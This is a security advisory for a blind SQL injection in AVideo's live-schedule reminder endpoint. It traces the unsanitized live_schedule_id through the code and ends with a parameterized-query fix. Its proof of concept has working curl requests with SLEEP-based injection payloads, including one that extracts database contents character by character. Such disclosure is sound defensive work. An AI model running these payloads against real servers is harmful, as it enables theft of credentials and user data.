# [H] AVideo has a Blind SQL Injection in Live Schedule Reminder via Unsanitized live_schedule_id in Scheduler_commands::getAllActiveOrToRepeat()

## Summary
Severity: High
Advisory: GHSA-pvw4-p2jm-chjm
CVE: CVE-2026-33651
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-pvw4-p2jm-chjm
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `remindMe.json.php` endpoint passes `$_REQUEST['live_schedule_id']` through multiple functions without sanitization until it reaches `Scheduler_commands::getAllActiveOrToRepeat()`, which directly concatenates it into a SQL `LIKE` clause. Although intermediate functions (`new Live_schedule()`, `getUsers_idOrCompany()`) apply `intval()` internally, they do so on local copies within `ObjectYPT::getFromDb()`, leaving the original tainted variable unchanged. Any authenticated user can perform time-based blind SQL injection to extract arbitrary database contents.

## Details

The vulnerability involves a 6-step data flow from user input to an unsanitized SQL sink:

**Step 1 — User input (no sanitization):**
`plugin/Live/remindMe.json.php:15`:
```php
$reminder = Live::setLiveScheduleReminder($_REQUEST['live_schedule_id'], ...);
```

**Step 2 — Auth check passes for any user:**
`plugin/Live/Live.php:4126`:
```php
if (!User::isLogged()) {
    $obj->msg = __('Must be logged');
    return $obj;
}
```

**Step 3 — intval() applied only internally, original variable unchanged:**
`plugin/Live/Live.php:4141-4143`:
```php
$ls = new Live_schedule($live_schedule_id);  // intval() inside getFromDb() only
$users_id = Live_schedule::getUsers_idOrCompany($live_schedule_id);  // same
```

`objects/Object.php:84` (inside `getFromDb()`):
```php
$id = intval($id);  // sanitizes the LOCAL parameter, not the caller's variable
```

With input like `1" AND SLEEP(5) --`, `intval()` extracts `1`, loads schedule ID 1 successfully. The caller's `$live_schedule_id` remains `1" AND SLEEP(5) --`.

**Step 4 — Tainted value flows to type string construction:**
`plugin/Live/Live.php:4152` → `Live.php:4193-4194`:
```php
$reminders = self::getLiveScheduleReminders($live_schedule_id);

// getLiveScheduleReminders calls:
$type = self::getLiveScheduleReminderBaseNameType($live_schedule_id);
// which builds: "LiveScheduleReminder_{$to_users_id}_{$live_schedule_id}"
return Scheduler_commands::getAllActiveOrToRepeat($type);
```

**Step 5 — SQL injection sink:**
`plugin/Scheduler/Objects/Scheduler_commands.php:340-347`:
```php
$sql = "SELECT * FROM " . static::getTableName() . " WHERE (status='a' OR status='r') ";
if(!empty($type)){
    $sql .= ' AND `type` LIKE "'.$type.'%" ';  // LINE 343: direct concatenation
}
$res = sqlDAL::readSql($sql);  // LINE 347: no parameterization
```

## PoC

**Prerequisites:** Any authenticated user session, at least one `live_schedule` record (ID=1).

**Step 1 — Baseline request (should return quickly):**
```bash
curl -s -o /dev/null -w "%{time_total}" \
  -b "PHPSESSID=<valid_session>" \
  "http://target/plugin/Live/remindMe.json.php?live_schedule_id=1&minutesEarlier=10"
```
Expected: response in ~0.1-0.5s

**Step 2 — Time-based injection (5 second delay):**
```bash
curl -s -o /dev/null -w "%{time_total}" \
  -b "PHPSESSID=<valid_session>" \
  --get --data-urlencode 'live_schedule_id=1" AND SLEEP(5) -- ' \
  --data-urlencode 'minutesEarlier=10' \
  "http://target/plugin/Live/remindMe.json.php"
```
Expected: response delayed by ~5 seconds, confirming injection.

The resulting SQL becomes:
```sql
SELECT * FROM scheduler_commands
WHERE (status='a' OR status='r')
  AND `type` LIKE "LiveScheduleReminder_123_1" AND SLEEP(5) -- %"
```

**Step 3 — Data extraction (example: first character of database user):**
```bash
curl -s -o /dev/null -w "%{time_total}" \
  -b "PHPSESSID=<valid_session>" \
  --get --data-urlencode 'live_schedule_id=1" AND IF(SUBSTRING(user(),1,1)="r",SLEEP(5),0) -- ' \
  --data-urlencode 'minutesEarlier=10' \
  "http://target/plugin/Live/remindMe.json.php"
```
If the response is delayed 5 seconds, the first character of `user()` is `r`.

## Impact

- **Full database read**: An attacker with any authenticated session can extract all database contents character-by-character using time-based blind techniques, including admin credentials, user PII (emails, passwords), API keys, and session tokens.
- **Data modification**: Depending on MySQL permissions, stacked queries or subquery-based writes could allow INSERT/UPDATE/DELETE operations.
- **Account takeover**: Extracted admin password hashes or session tokens enable full platform compromise.
- **Low barrier**: Only requires a basic authenticated account — no admin privileges needed.

## Recommended Fix

**Option 1 — Parameterize the query in `Scheduler_commands::getAllActiveOrToRepeat()`:**

`plugin/Scheduler/Objects/Scheduler_commands.php:335-347`:
```php
public static function getAllActiveOrToRepeat($type='') {
    global $global;
    if (!static::isTableInstalled()) {
        return false;
    }
    $sql = "SELECT * FROM " . static::getTableName() . " WHERE (status=? OR status=?) ";
    $formats = "ss";
    $values = [self::$statusActive, self::$statusRepeat];

    if(!empty($type)){
        $sql .= ' AND `type` LIKE ? ';
        $formats .= "s";
        $values[] = $type . "%";
    }

    $sql .= self::getSqlFromPost();
    $res = sqlDAL::readSql($sql, $formats, $values);
    $fullData = sqlDAL::fetchAllAssoc($res);
    sqlDAL::close($res);
    $rows = array();
    if ($res != false) {
        foreach ($fullData as $row) {
            $rows[] = $row;
        }
    }
    return $rows;
}
```

**Option 2 — Additionally sanitize at the entry point:**

`plugin/Live/remindMe.json.php:15` (defense in depth):
```php
$_REQUEST['live_schedule_id'] = intval($_REQUEST['live_schedule_id']);
$reminder = Live::setLiveScheduleReminder($_REQUEST['live_schedule_id'], ...);
```

Both fixes should be applied for defense in depth.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-pvw4-p2jm-chjm
- https://nvd.nist.gov/vuln/detail/CVE-2026-33651
- https://github.com/WWBN/AVideo/commit/75d45780728294ededa1e3f842f95295d3e7d144
- https://github.com/WWBN/AVideo
